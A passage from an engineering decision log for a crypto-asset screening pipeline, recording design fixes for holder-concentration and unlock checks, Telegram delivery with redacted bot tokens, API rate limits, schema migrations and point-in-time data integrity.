precisely why this read as correct in review.

---

## D-034 — The daily summary is sent from `screen`, and a failed send is not "skipped"

**Date:** 2026-09-13 · **Status:** accepted

Phase 9 built Telegram delivery and wired it into the CLI only. No workflow
passed `TELEGRAM_BOT_TOKEN` or `TELEGRAM_CHAT_ID` to a job and none ran
`report --telegram`, so setting both secrets produced no message, ever, and
nothing reported the gap.

`screen.yml` now sends the summary after the screen and before the healthcheck
ping, with `continue-on-error: true`. `publish` runs only when `screen`
concludes success, so an unguarded Telegram outage would stop the dashboard
updating over the least important artefact in the pipeline. The ping stays
after it and still means "the screen succeeded".

The CLI printed `telegram: not configured, skipped` for every unsent message --
including a configured bot whose token Telegram rejected. That reads as a setup
gap when it is a delivery failure. Unset secrets are now a skip (exit 0); a
configured send that fails exits 1, which marks the step failed on a green job.

**Verified, not assumed.** httpx logs every request at INFO with the full URL,
and Telegram carries the bot token as a URL path segment, so `telegram.py`'s
care never to log the URL does not cover httpx's own line. Driving the real
`send_message` through the real logging configuration against a mocked
Telegram, for both 200 and 401, produced
`https://api.telegram.org/***redacted***/sendMessage` in the console and the
JSON log: the value-shape redactor (D-025) catches it. GitHub also masks
registered secrets in Actions logs; this does not rely on that.
`tests/test_telegram_delivery.py` pins the redacted line and the three CLI
outcomes.

**Found while wiring it up: the summary itself would have been rejected.**
`send_message` uses `parse_mode: Markdown`, where `_` opens italics, and every
check ID carries underscores. The 10 Sep dark-check line --
`L1_HOLDER_CONC, L1_MCAP_LIQ, L1_UNLOCK` -- holds five, so an entity is left
unclosed and, under the Bot API's Markdown rules, the whole message is refused.
The first send from Actions would have failed on precisely the days the
dark-check line exists to be read. Dynamic text is now escaped with a
backslash; `TestSummaryIsParseableMarkdown` asserts no unescaped `_` or `[`,
and no unbalanced `*`, survives outside a code span.

---

## D-035 — A native coin is not applicable to the holder check

**Date:** 2026-09-13 · **Status:** accepted · **Agreed with the user**

L1_HOLDER_CONC reads the top-10 holders of a token contract. A chain's own
coin -- BTC, ETH, SOL, BNB, HYPE, AVAX -- has no token contract, so there is
nothing to read. Under the per-asset rule (a missing input FAILS the asset),
switching the check on would have disqualified every native coin in the
universe for being native: 112 of the 455 screened assets with a CoinGecko id
on 2026-09-13.

`asset_contract.applicability` has three values, and each is handled
differently:

| Value | Meaning | L1_HOLDER_CONC |
|---|---|---|
| `measurable` | a token contract on a chain GoPlus serves | judged on its number |
| `native_coin` | a chain's own coin | **passes, reason "not applicable"** |
| `unsupported_chain` | origin chain no holder source covers (Sui, TON) | fails closed -- that one IS a gap |

Native is decided first from CoinGecko's `/asset_platforms` (`native_coin_id`),
then from a coin that lists no contract anywhere (`resolved_via =
no_platforms`). The second rule is an assumption -- overwhelmingly XRP, ADA,
DOGE-type chains -- and `resolved_via` keeps it auditable per asset.

For source coverage (D-007) a native coin counts as resolvable, so natives do
not drag coverage under the floor and switch the check off for everyone.

**More chains, as asked.** Readable chains are derived rather than listed: a
CoinGecko platform is readable when its EVM `chain_identifier` appears in
GoPlus's own `supported_chains` (43 on 2026-09-13), plus Solana and Tron. When
GoPlus adds a chain, coverage widens with no code change. The projection on
2026-09-13 was 324 measurable, 112 native and 19 unsupported, most of the
unsupported on Sui and TON.

**Multi-chain tokens.** 189 measurable assets exist on more than one supported
chain, and only the origin chain's holders describe the token -- a bridged
copy's top holder is the bridge. CoinGecko's `asset_platform_id` settles the
origin; it costs one call each at 10/min, so it is looked up in bounded
batches and cached. Until then the first platform CoinGecko lists is used and
marked `coins_list_first_platform`. An origin on a chain we cannot read makes
the token `unsupported_chain`: a bridge copy is never measured in its place.

---

## D-036 — What counts as holder concentration

**Date:** 2026-09-13 · **Status:** accepted · **Resolves R1 and R5**

Source: GoPlus `token_security` -- free, keyless, one contract per call (a
comma-separated list returns one result).

**A raw top-10 sum fails healthy tokens.** Measured live, not assumed:

| Token | Largest holder | Share | Raw top-10 |
|---|---|---:|---:|
| CAKE | `0x...dead` (burned) | 92.6% | 96% |
| AERO | `VotingEscrow` (veAERO) | 50.0% | **67% -- fails 0.60** |
| AAVE | `Staked AAVE` (safety module) | 15.5% | 43% |

GoPlus's `tag` field was empty on all 40 holders pulled, so filtering on the
labels its documentation describes excludes nothing. A holder is excluded,
with the reason recorded in `holders_json`, when it is:

1. a burn address (`config/excluded_addresses.yaml`);
2. `is_locked = 1` in GoPlus;
3. one of the token's own DEX pairs (GoPlus `dex[].pair`);
4. curated in `config/excluded_addresses.yaml` -- exchange wallets above all,
   and only with a label and a source someone checked;
5. a contract whose name matches `settings.holders.exclude_contract_name_patterns`.

Names come from Blockscout, which reports the **implementation** behind a
proxy. That is what makes rule 5 work: `ATokenWithDelegationInstance` (lenders'
deposits) is excluded, while `Safe` (a multisig) and `AaveEcosystemReserveV2`
(a treasury) are deliberately not -- those are one party, which is exactly the
RAVE pattern the check exists for.

The excluded share leaves the denominator too: with half the supply in escrow,
30% held by the top holders is 60% of what can trade. `top10_share_raw`,
`top1_share` and `excluded_share` are stored beside the effective figure, so
the gap between raw and effective stays visible.

**Limits, recorded rather than hidden.**
- Only the top 10 are visible. After exclusions fewer than ten real holders
  remain, so holders 11 onwards are missing from the numerator.
- Solana returns token accounts, not owners, and no DEX pairs. One owner can
  hold several accounts and a pool vault is an account, so a Solana reading is
  approximate in both directions (`data_quality = token_accounts`). The public
  Solana RPC returned 429 on its first `getTokenLargestAccounts`, so it is not
  used as a cross-check.
- Chains with no Blockscout instance (BSC among them) get no names, so pooled
  contracts there are counted as holders -- conservative, flagged
  `names_unavailable`.
- Every visible top holder excluded is reported as unmeasured, never as 0%.

Holders refresh in rolling batches on `collect-supply`. The screen reads the
newest row per asset no older than `holder_snapshot_max_age_days` (14); a
failed read writes nothing, so the last good measurement stands until it ages
out.

---

## D-038 — L1_UNLOCK requires an unlock schedule, not any event

**Date:** 2026-09-13 · **Status:** accepted · **Fixes a live defect**

`check_unlock` gated on `has_event_data`. An asset whose only event on file was
a listing therefore had event data, no vesting schedule, and fell through to
`days_to_next_major_unlock is None` -- reported as "no major unlock scheduled
ahead". Ignorance read as a clean schedule. D-022 fixed the same confusion in
Layer 2; it survived in Layer 1 because the unlock check was dark and nothing
exercised it.

The check now gates on `has_unlock_record`, and so does its source-coverage
input, so a run full of listing events can no longer make the unlock check
look live. Regression tests: `TestUnlockCheckNeedsASchedule`.

---

## D-037 — The unlock source is DefiLlama's datasets host

**Date:** 2026-09-13 · **Status:** accepted · **Resolves R4; supersedes the source chain in D-008**

The emissions-adapters repository proposed as the source is **no longer
public**: `github.com/DefiLlama/emissions-adapters` returns 404, as do the
obvious renames, and the only recent copy (created and last pushed the same
day, 2026-04-01) carries no license. It cannot be vendored or self-computed.

What does work, verified live:

| Endpoint | Result |
|---|---|
| `api.llama.fi/emissions`, `/emission/{slug}` | 402, paid plan |
| `defillama-datasets.llama.fi/emissionsProtocolsList` | **200**, 372 protocols |
| `defillama-datasets.llama.fi/emissions/{slug}` | **200**, 0.1-2.5 MB each |

The datasets host serves the adapters' computed output. Per protocol,
`metadata.unlockEvents` lists cliff and linear allocations with an explicit
`recipient` and `category`, and a top-level `gecko_id` joins directly to
`market_snapshot.coingecko_id` (a protocol without one is matched through its
`<platform>:<address>` token against `asset_contract`).

**Category to recipient_type** (`settings.unlocks.category_map`):
`insiders` team; `privateSale` investor; `publicSale`, `airdrop`, `farming`,
`staking`, `liquidity` community; `ecosystem` ecosystem; `noncirculating`
(foundation and community reserves) ecosystem, agreed with the user;
`Uncategorized` NULL. A NULL recipient inside the window is still judged on
size, because an unlabelled cliff is not a harmless one.

**Point-in-time rules.**
- `first_seen_utc` is when we first saw the event, and a refresh never moves it.
- The event id excludes the amount, so a revised size updates the event
  instead of adding a second that double-counts the unlock.
- A FUTURE event a refresh no longer lists gets `retracted_utc`; it is never
  deleted. `load_known_events` shows it to any as-of date before the
  retraction and hides it after.
- If two protocols resolve to one asset, the fuller schedule wins and the
  other is logged, not merged.

**Linear vesting** is stored as `unlock_linear` at each rate change, sized as
the lookahead window's worth of tokens at the new weekly rate, so the same
5%-of-circulating test applies to a stream as to a cliff. A stream that began
before the window and is still running produces no future event; the check
sees rate changes, not a stream's continuation.

**Approximation.** `pct_of_circulating` uses today's circulating supply for
every event, past ones included, so "days since the last major unlock" judges
history by today's float.

**Refresh.** Bounded per run: protocols mapped to a screened asset re-fetch
after 7 days, unmapped ones are re-checked after 30, and never-seen ones come
second so the mapping bootstraps. History older than 730 days is not stored.

**Coverage is skewed toward established tokens** and cannot be fixed from
here: most microcaps have no adapter. Whether L1_UNLOCK crosses the 20%
coverage floor, and what it does to the survivor list when it does, was
measured on the first live run -- see the entry below this one.

---

## D-039 — Added columns reach databases that already exist

**Date:** 2026-09-13 · **Status:** accepted

`CREATE TABLE IF NOT EXISTS` never alters an existing table. A column added to
`schema.sql` reached fresh databases and silently never reached the local
sqlite file or the Turso database already in production, where the first
query naming it would fail at 3am.

`connection.ADDED_COLUMNS` lists columns added after a table shipped.
`Database.ensure_columns()` adds any that are missing with `ALTER TABLE ... ADD
COLUMN` -- additive only, idempotent, skipping tables that do not exist yet --
and then runs statements that depend on them (the `source_ref` index). It runs
inside `apply_schema`, and once per database per process from
`open_database()`, because `screen.yml` never runs `init-db` and the screen
reads two of the new columns. Test: `TestAddedColumnsReachExistingDatabases`.

---

## D-040 — Holders and unlocks run in their own workflow

**Date:** 2026-09-13 · **Status:** accepted

`collect-supply.yml` runs the `supply` tier: `asset_contracts`, `holders`,
`unlocks`, in that order. These sources are free but slow -- GoPlus is ~25
calls a minute, CoinGecko's origin lookups 10, DefiLlama up to 2.5 MB per
protocol -- and inside `collect-daily` they would push a 20-minute job past its
timeout and take the price and derivatives snapshots down with them. `unlocks`
moved out of the daily tier for the same reason.

Every collector in the tier refreshes in bounded batches and keeps what it
already has, so a run cut short loses progress, never data. Like every workflow
here it is `workflow_dispatch` only, and it pings `HEALTHCHECK_SUPPLY` on
success when that secret is set.

---

## D-041 — No unlock schedule on file is not a failure

**Date:** 2026-09-14 · **Status:** accepted · **The user's decision; supersedes the per-asset rule for L1_UNLOCK**

The first live screen with R4 data (2026-09-14, local) put 121 of 528 assets
(22.9%) on a DefiLlama unlock schedule. That crossed the 20% coverage floor, the
check went live, and under D-007's per-asset rule every asset without a schedule
failed it: 145 newly disqualified -- AAVE, ADA, BNB, ATOM, BCH among them, most
with no vesting at all -- and survivors fell from 207 to 34. Only one of the
146 new L1_UNLOCK failures was a real unlock (2Z, 8.6% to investors in 18 days).

The user's position: unlocks are one criterion, not the screen. An absent
adapter is a gap in DefiLlama's coverage, not evidence about the asset, and
letting it disqualify three quarters of the universe hands the whole verdict to
one data source.

**What the check does now.**
- No schedule on file: **passes**, reason "not assessed: no unlock schedule on
  file for this asset". Never "no major unlock scheduled ahead" -- that sentence
  is reserved for an asset whose schedule was actually read (D-038 still holds).
- A schedule on file: judged exactly as before. A team or investor unlock above
  5% of circulating inside 30 days fails; an unsized one inside the window fails.

**What stays visible.** Coverage is still computed and reported on the Health
page, and the L2 events block still refuses to score an asset with no schedule as
clean (D-022). The trade-off, recorded plainly: a microcap with a large unlock
that DefiLlama does not track now passes L1_UNLOCK. The check can only catch
what is on the calendar.

---

## D-042 — Holder data is one day fresh, and never capped

**Date:** 2026-09-14 · **Status:** accepted · **The user's decision; supersedes the 14-day window in D-036**

D-036 accepted a holder snapshot up to 14 days old, on the reasoning that
concentration moves slowly, and a per-run cap was proposed so a full refresh
could spread across runs. The user rejected both: the screen must run on the
freshest data at all times, and holder data must be as current as the prices it
is judged beside.

- `layer1.holder_snapshot_max_age_days` is **1**: a reading from the run date or
  the day before counts, nothing older does.
- `holders.max_tokens_per_run` stays above the measurable universe (400 against
  315): every run re-reads every token. It is a safety bound, not a rotation.
- `collect-supply` must therefore run **daily**, after `collect-daily`. Its
  timeout rose from 60 to 90 minutes, because a full holder refresh took ~32
  minutes at GoPlus's free-tier pace on 2026-09-14 and a timeout loses the run.

**The failure mode this chooses.** A missed supply run leaves every holder
reading two days old the next morning. Coverage for L1_HOLDER_CONC then drops
under the 20% floor and the check goes dark for that run -- reported on the
Health page and in the report -- instead of screening on stale holders or
failing the universe. That is D-007 working as intended: loud, not wrong.

Speeding the refresh up is the next question: a GoPlus access token (see the
entry that follows, once assessed).

---

## D-043 — Verified exchange wallets are excluded from holder concentration

**Date:** 2026-09-14 · **Status:** accepted · **The user's decision (option "A + B"); completes R5**

With every holder read recovered (D-042's retry, 0 lost reads), 207 of 309
measured tokens read above the 0.60 top-10 threshold. The user chose to keep
the threshold as built (A) and to exclude exchange wallets properly (B) --
not to soften the check for thin readings.

**How the list was built.** Candidates were the non-contract wallets appearing
in the kept top 10 of five or more unrelated tokens (35 found). Each was checked
against its public name tag on the chain's explorer, and only tagged ones went
into `config/excluded_addresses.yaml`, with label, source URL and date:

- Ethereum (18): Binance Hot Wallet 20, 14, 28, 117 and its peg-token custody
  wallet (category `bridge`); OKX 193, 154 and Cold Wallet; Bybit Hot Wallet and
  Wallet 84; Kraken 246; two Gate deposit wallets; Crypto.com 16 and 22; BtcTurk
  13; Bitvavo Hot 3; Paribu 14.
- Base (2): Binance Hot Wallet 20; Bybit Hot Wallet 6.
- BSC (9): BscScan refuses automated reads, so tags were read on Etherscan. An
  externally-owned address is the same key on every EVM chain; contracts are not
  carried across chains this way.

Left out on purpose: four wallets with no public tag (an unlabelled wallet may be
a whale, and excluding it would hide real concentration) and two BSC contracts.
A test now fails if any curated entry lacks a label, a source or a date.

**Effect, measured on the 2026-09-14 local screen:** measured holder failures
fell from 207 to 176, and L1 survivors rose from 140 to **152 of 528 (28.8%)** --
inside the 20-50% band. The 176 that still fail are led by 77 unlabelled wallets
or Solana token accounts, 38 multisigs, 39 unnamed BSC contracts and 22 other
named contracts. Treating thin readings as advisory would add 19 more survivors;
that was offered and not chosen.

---

## D-044 — GoPlus calls are evenly spaced; it barely shortens the refresh

**Date:** 2026-09-14 · **Status:** accepted · **Tested at the user's request**

The 20/min burst run spent most of its 27 min 43 s in 48 backoff waits of
15-60 s, and the first came 2 s in: a sliding-window limiter lets the whole
minute's budget go at once. The question was whether spacing calls evenly would
avoid the refusals and shorten the refresh without a GoPlus token.

**Probes** (evenly spaced, no backoff; table in API_DEVIATIONS.md): no spaced
rate from 12 to 30/min ran clean, and successful reads topped out at 11.5-16.9
per minute. The keyless ceiling is the limit, not the shape of the traffic.

**Live run**, spaced at 25/min with a short doubling wait (3 s, 6 retries):

| | Burst, 20/min, 15 s wait | Spaced, 25/min, 3 s wait |
|---|---:|---:|
| Holder run | 27 min 43 s | 26 min 31 s |
| GoPlus calls | 363 | 402 |
| Refused (code 4029) | 48 | 87 |
| Lost reads | 0 | 0 |
| Reads per minute | 11.4 | 11.9 |

Refusals cluster: after one, the next few calls are refused too, so a short
wait mostly buys another refusal. Kept, because it is no slower, loses no read,
and is a small addition to the limiter (`rate_limit_spacing`, off for every
other source). But it is not the answer to a faster refresh: GoPlus serves
about 12 keyless reads a minute to one IP, so ~315 tokens need ~26 minutes
whatever the pacing. Only a higher limit (a GoPlus token, D-042) or fewer calls
changes that.

---

## D-045 — The supply tier runs as a job inside collect-daily

**Date:** 2026-09-14 · **Status:** accepted · **Amends D-040; moves the journal slot**

D-040 gave holders and unlocks their own dispatch-only workflow, and the runbook
planned to trigger it at 04:10 UTC. That order was wrong: `screen` chains off
`collect-daily` and runs around 03:30, so it would have screened on the previous
day's holder readings every day -- the opposite of D-042.

**Why not chain it.** Making `collect-supply` a `workflow_run` link between
`collect-daily` and `screen` was the obvious fix, and it fails silently. GitHub
runs at most three `workflow_run` levels after a dispatched workflow ("if you
attempt to trigger ... `A` → `B` → `C` → `D` → `E` → `F`, workflows `E` and `F`
will not be run"). `screen` → `publish` → `build-site` already uses all three;
a supply link would make `build-site` the fourth, and the dashboard would stop
rebuilding with no error anywhere.

**What was built.** A `supply` job in `collect-daily.yml`:

- `needs: collect` -- the holder and contract collectors read the newest
  `universe_snapshot` and `market_snapshot`. Run earlier, an asset that entered
  the universe that day would have no reading and fail L1_HOLDER_CONC on day one.
- only for the `daily` tier;
- `continue-on-error: true` -- a failed or timed-out supply run leaves the
  workflow green, so the screen still runs on yesterday's readings (still valid
  under D-042). The failure shows as a red job and a missing `HEALTHCHECK_SUPPLY`
  ping; a second missed day turns the check off under D-007.
- the `collect-supply` concurrency group, shared with `collect-supply.yml`, which
  stays as the manual path (bootstrap, re-run) so the two never read GoPlus at once.

No new cron-job.org job is needed.

**The cost: journal moves from 04:10 to 06:10 UTC.** The journal records that
day's ranking, and the screen now ends around 04:30 -- at worst 05:20, with every
job at its timeout. A journal firing first would find no ranking and skip the
day for good. This departs from `IMPLEMENTATION_SPEC.md`'s 04:10 slot on purpose.

---

## D-046 — A base asset names one contract

**Date:** 2026-09-15 · **Status:** accepted

`parse_symbol` strips a multiplier prefix so `1000PEPEUSDT` looks up as PEPE.
That is only safe while nothing else reduces to the same name. The 2026-09-09
universe held `BOBUSDT` (Build on Bitcoin, ~$15M market cap) and
`1000000BOBUSDT` (an unrelated meme coin) and stored both as `BOB`. Every table
keyed on `base_asset` mixed them: `price_daily` carried the meme coin's price
(klines kept the higher-volume bar) beside the other token's market cap, and a
journal entry would have taken its entry and exit prices from different coins.

**Rule.** A venue's symbols are parsed as one list (`symbols.parse_universe`).
When a multiplied contract's stripped base is also claimed by another contract,
every multiplied contract keeps its prefix as its base (`1000000BOB`, multiplier
1). The prefixed base matches no market-cap source and fails L1_NO_MCAP. That is
deliberate: nothing here can say which token it is, and disqualification is the
safe direction. `load_snapshots` also keeps one contract per base (the
unmultiplied one) for universe snapshots written before this rule.

**Also.** `1M` is a multiplier prefix (`1MBABYDOGEUSDT` → BABYDOGE). Index perps
(`underlyingType: INDEX`, e.g. BTCDOMUSDT) leave the universe: they track a
basket, so market cap, supply and holders do not exist for them.

**Existing data.** `price_daily` rows for `BOB` written before this change are
the meme coin's. Re-backfill klines for BOB after the first run under this rule.

---

## D-047 — Returns are measured on Binance kline closes only

**Date:** 2026-09-15 · **Status:** accepted

`price_daily` has two writers. CoinGecko writes the collection-time price
(~03:10) under its own ticker; the next day's klines run replaces that row with
the Binance contract's real close. The journal took its entry from whichever
row existed at 06:10 on the signal day (CoinGecko's), and its exit from
whichever existed when the horizon was filled -- CoinGecko's if on time, a kline
close if filled late or if CoinGecko missed that day. Two sources, two times of
day, and for a ticker CoinGecko resolves to a different token than Binance
lists, two different coins. The harness can only rebuild kline closes, so it
could not agree with the journal by construction.

**Rule.** Every return, in the journal and the harness, reads
`source = 'binance_klines'` through the same functions
(`forward_returns.entry_close` and `horizon_close`):

- entry: the close of the signal day. The screen ran at ~03:10 on data from
  minutes earlier, so this is the first price strictly after everything the
  ranking knew. No fallback to an earlier day: that would be look-ahead.
- exit: the close `h` days later, back at most a week, never to the signal day.
- excursions: the bars from the day after the signal through the exit.

**Cost.** A horizon fills one day later than before: the exit bar only exists
once the next day's klines run has written it.

`journal_entry.price_at_signal` keeps its meaning -- the price the screen saw --
and is context only. Each `forward_return` row now records the `entry_price` it
was measured from and its `price_source`. Rows written before this change have
neither set and were measured from `price_at_signal`; they stay as written,
because the table is append-only.

---

## D-048 — A past `--as-of` is refused unless the source serves history

**Date:** 2026-09-15 · **Status:** accepted

`collect --as-of` only changed the date on the timestamp. Every collector but
klines reads an API that serves the present, so `collect daily --as-of
2026-09-01` stamped that morning's universe, market caps and derivatives onto
2026-09-01, and the upsert overwrote what had been recorded that day. Nothing
downstream could tell: the rows carried a real `fetched_at_utc` and a plausible
date. For a backtest that depends on point-in-time snapshots, that is permanent
corruption from one command.

**Rule.** A collector declares `accepts_past_as_of`. Only klines does: it serves
history and drops every bar from `as_of` onward. A past date on anything else,
or a future date on anything, refuses the whole command with exit 2 -- all or
nothing, because half a tier recorded for a past day looks like a complete one.

---

## D-049 — Coinalyze: the previous full day, in seconds, never a fabricated zero

**Date:** 2026-09-15 · **Status:** accepted · **Confirm against a live response once COINALYZE_API_KEY is set**

Three defects in one call, none visible so far because the collector has only
ever run without a key:

- `from`/`to` were sent in milliseconds; Coinalyze takes Unix seconds.
- The window ended at run time, so a 03:10 run asked mainly for today's partial
  daily bar -- three hours of liquidations presented as a day's.
- An empty `history` summed to `0.0`, which check 9 would read as a measured day
  with no liquidations rather than a missing reading.

**Rule.** Request the previous complete UTC day in seconds, count only the bar
inside that window, and write no row when there is none, so coverage and check 9
see a missing value. When the key is added, check the units and the bar
timestamp against a real response and save it as a fixture.

---

## D-050 — "Latest" and "fresh" mean Binance's latest

**Date:** 2026-09-15 · **Status:** accepted

Hyperliquid writes `derivatives_snapshot` and `universe_snapshot` every hour,
beside Binance. Several queries took `MAX(...)` over the whole table:

- `doctor` and the screen's `assert_fresh`: a dead Binance feed read as fresh as
  long as Hyperliquid was running, so the screen ran on days-old Binance data.
- `_latest_derivatives`: the newest timestamp could be Hyperliquid's, which
  matches no Binance row, so every OI and perp-volume input read as missing.
- klines, DefiLlama and news: a Hyperliquid-only date matched no Binance row
  (klines then fetched nothing and still reported success), or brought
  Hyperliquid tickers into a Binance universe.

**Rule.** Each of these filters `exchange = 'binance'`. `doctor.FRESHNESS_TARGETS`
carries the filter, and `assert_fresh` reads the same tuple, so the dead-man
check and the screen cannot disagree about what fresh means.

---

## D-051 — A klines run with failing symbols is partial, and past 20% it is failed

**Date:** 2026-09-15 · **Status:** accepted

Per-symbol failures were logged with `self.log.warning`, not `self.warn`, so
they never reached the run status: a 418 ban that failed every symbol recorded
`success` with zero rows.

**Rule.** A failed symbol is a `warn()`, which makes the run `partial`. Above
20% of symbols the run raises and is `failed`, which fails `collect daily` and
stops the screen for the day -- the journal and Layer 3 read these bars, so a
screen on a mostly-missing price history is worse than none. Nothing is lost:
bars are history, and the next run's seven-day overlap fetches them again.

---

## D-052 — Rate-limit guidance is obeyed: a 418 stops the run, Retry-After is honoured

**Date:** 2026-09-15 · **Status:** accepted

418 and 429 were retried like any 5xx: five attempts on an exponential backoff
worth about fifteen seconds, ignoring `Retry-After`. Both were wrong:

- **418 is Binance's IP ban**, and Binance lengthens a ban for every request made
  during it. The per-symbol loops (open interest, klines) then carried on, one
  banned call per symbol.
- **429 from CoinGecko's free tier** asks for a cool-down of about a minute.
  Fifteen seconds of backoff gave up first, which is how pagination truncated.

**Rule.** 418 is not retried: it sets a flag on the collector, and every later
request raises `IPBannedError` without touching the network, so the run fails
(klines past its 20% ceiling, D-051) instead of extending the ban. A retryable
response carrying `Retry-After` in seconds waits that long, capped at 120s, in
place of the exponential step.

---

## D-053 — What an upsert may overwrite, and how much it sends at once

**Date:** 2026-09-15 · **Status:** accepted

Three defects in `db/writes.upsert`:

- **Batching.** Every row went in one `executemany`, which on Turso is one
  libSQL HTTP request. The klines backfill wrote 356,358 rows that way. Now
  batches of 500, the size `ops/migrate.py` already copies in.
- **NULL over a good value.** A same-day re-run whose funding-history read was
  rate-limited wrote NULL over the interval the first run had derived. Columns in
  `KEEP_WHEN_NULL` (so far `universe_snapshot.funding_interval_hours`) update
  through `COALESCE(new, old)`. The date is in every key, so this can only ever
  keep a value from the same day.
- **First-seen measurements rewritten.** `news_item` re-stamped `fetched_at_utc`
  and `lag_seconds` on every hourly run, so "how late did we see it" became "how
  old is it", and all 74 rows shared one fetch time. Columns in `FIRST_SEEN` are
  never updated after insert.

---

## D-054 — The CoinGecko plan is configured, not inferred from the key

**Date:** 2026-09-15 · **Status:** accepted

With any key set, the collector switched to `pro-api.coingecko.com` and the
`x-cg-pro-api-key` header. The free key CoinGecko issues is a **Demo** key, which
is accepted only on `api.coingecko.com` with `x-cg-demo-api-key`. Adding the free
key would therefore have failed page 1, which re-raises: the whole collector
fails, no asset has a market cap, and every asset fails L1_NO_MCAP -- a worse
day than running keyless.

The two key kinds look alike (both begin `CG-`), so the prefix cannot choose.
**Rule.** `universe.coingecko_plan` in `config/settings.yaml` (`demo`, the
default, or `pro`) decides host and header. No key means keyless on the public
host, whatever the setting.

---

## D-055 — An unlock revision is recorded, so the old schedule stays readable

**Date:** 2026-09-15 · **Status:** accepted

`merge_events` updated a revised event in place -- size, share, recipient,
confidence -- keeping `first_seen_utc`, and reset `retracted_utc` when an event
reappeared. `first_seen_utc <= as_of` protects against events that did not
exist yet, not against events that were different then: a screen dated before
a revision saw the revised size, and a re-listed event erased its retraction.

**Rule.** The update is kept (every reader expects one row per event), but the
values it replaces are first appended to `scheduled_event.revisions_json` with
the time they stopped being current. `load_known_events` reads each event as of
its cutoff: values from the earliest revision recorded after the cutoff, and
excluded if it stood retracted then. The column arrives through
`ADDED_COLUMNS`, so the screen gets it without running `init-db`.

**Also.** DefiLlama token references use its own chain names (`arbitrum`,
`avax`, `bsc`) while `asset_contract` is keyed by CoinGecko platform
(`arbitrum-one`, `avalanche`, `binance-smart-chain`). 17 of 372 protocols stayed
unresolved for that reason alone. `DEFILLAMA_CHAIN_ALIASES` maps them.

---

## D-056 — Hyperliquid's k-prefix and its delisted assets

**Date:** 2026-09-15 · **Status:** accepted

- `kPEPE` is a thousand-PEPE contract. Upper-casing the name stored base `KPEPE`
  with multiplier 1, which matches no other source. It is now base `PEPE` with
  multiplier 1000. Only a lower-case `k` before an upper-case name counts, so
  `KAITO` stays `KAITO`.
- A delisted asset stays in `meta` with `isDelisted: true`. It was written to
  `universe_snapshot` as `TRADING`, putting it in the point-in-time universe. It
  is now `DELISTED`.

---

## D-057 — The unlock kill check sees the worst unlock in its window

**Date:** 2026-09-15 · **Status:** accepted · **Tightens L1_UNLOCK**

`next_major` was simply the nearest major unlock, whoever received it. An 8%
ecosystem unlock in five days therefore hid a 20% team cliff in twenty: Layer 1
read "ecosystem" and passed. Unlocks to one recipient that were each under 5%
were never added together, however many landed inside the window.

**Rule.** Inside the 30-day window, every supply event whose recipient could fail
the check (team, investor, or unknown) is summed per recipient; the largest total
-- an unsized one first -- is what Layer 1 sees. Only when nothing qualifies is
the nearest major unlock of any recipient shown, for Layer 2's distance metric.

**Also.** `unlock_overhang_cleared` is false for any asset with a linear vesting
stream on file. Unlock rows mark rate changes and a stream ending adds no row, so
a stream that began in the past may still be vesting and its overhang cannot be
shown to have cleared. Recording the stream's end date would lift this.

---

## D-058 — A dark source never pardons a measured failure

**Date:** 2026-09-15 · **Status:** accepted · **Tightens D-007**

D-007 turned a check off for the run when its source coverage fell under the
floor, which is right for the assets that could not be measured. It also passed
the assets that WERE measured and failed: a 95% holder share on a day holder
coverage dipped to 19%. A check now stays failed for an asset whose failure is a
real reading; only a `data_unavailable` failure is pardoned by a dark source.

Two pipeline inputs in the same family:

- `L1_PERP_SPOT` coverage keyed on the spot pair alone. A derivatives outage left
  coverage intact while every asset with a spot pair failed "perp volume
  unavailable". Coverage now needs a spot pair and a perp volume.
- The market-cap change implied by a -100% move came out as +market cap: a total
  collapse recorded as a gain. It is now undefined (None).

---

## D-059 — A Layer 2 block with nothing measured is None

**Date:** 2026-09-15 · **Status:** accepted

The renormalisation rule -- an unmeasured block is None and its weight moves to
the others -- was defeated inside two blocks:

- **events**: the catalyst and monitoring flags were filled with False and counted
  as measured, so an asset we knew nothing about scored about 50. A known catalyst
  still scores 100; no known catalyst is now no reading. A monitoring tag sets the
  block to 0 whatever else is known.
- **drawdown**: the overhang interaction was always measured, so an asset with no
  ATH scored 0 instead of None.

`unlock_overhang_cleared` had been counted three times (supply bonus, events,
drawdown). It now counts once, in supply.

Smaller defects in the same module:

- A negative revenue gave a negative price-to-sales, which ranked as the cheapest
  asset. P/S is measured for positive revenue only.
- One asset past the attention gate ranked first of one and scored 100. The gated
  metric needs at least three assets past the gate.
- The sector block read BTC's return from the survivors, so BTC failing Layer 1
  switched the block off for every asset. The benchmark return now comes from
  price history, and a "7 days ago" price may be at most three days older than
  that.

---

## D-060 — Layer 3 reads closed bars, Binance derivatives, and hours as hours

**Date:** 2026-09-15 · **Status:** accepted

- **Bars still forming.** Weekly bars open on Monday. On any other day the newest
  bar held only part of its week, and a break was reported as confirmed on a
  weekly close that had not happened. A final bar whose period has not ended by
  `as_of` is dropped. 3D bins were anchored to the first day loaded, which moves
  with the 1,100-day window, so every 3D boundary shifted by a day each morning;
  they are now anchored to the epoch.
- **Venues.** The funding and OI queries had no exchange filter. Hyperliquid's
  hourly rows interleaved with Binance's in one series, so a "change" could
  compare one venue's contracts with the other's, and `iloc[-1]` was whichever
  venue sorted last. Both read Binance only.
- **Windows.** `pct_change(periods=24)` compared rows 24 apart and called it 24
  hours -- about 12 with two venues, about 2 on the 5-minute host tier. The
  change is now against the reading N hours earlier, within 90 minutes, and the
  latest reading must have one.

Two Layer 3 tests could not fail and now assert what they are named for: the
invalidation test's break was always stale, so its assertions sat inside an `if`
that never ran; and the funding test's timestamps never put the extreme reading
last, and it then grepped the module's own source instead of calling it.

---

## D-061 — A delisted asset exits at its last close

**Date:** 2026-09-15 · **Status:** accepted

The journal looked for a horizon price at most a week before the horizon date,
and the harness three days. An asset delisted inside the horizon had neither, so
its journal row stayed pending forever and the harness skipped the trade. The
assets that stop trading are the worst outcomes this system can record, and they
were the ones that never reached the statistics.

**Rule.** `forward_returns.exit_bar`, shared by both: the horizon close when one
exists; otherwise, if a Binance universe snapshot from the week before the horizon
no longer lists the asset as trading, its last close after the signal, with
`exit_reason = 'delisted'`. With no recent snapshot on file the row stays pending
-- an outage of ours is not a delisting. BTC's return is measured over the same
holding period, ending on the day the position actually exited; before, the asset
and BTC each fell back independently, up to a week apart.

---

## D-062 — One control group per day, and a skipped journal day fails

**Date:** 2026-09-15 · **Status:** accepted

- The survivor pool was sampled with no `ORDER BY`, so the seeded draw depended
  on the order the backend returned rows in. It is sorted first.
- Control ids are per asset. Re-running a day whose survivor pool had changed
  drew a different sample and inserted it beside the first group.
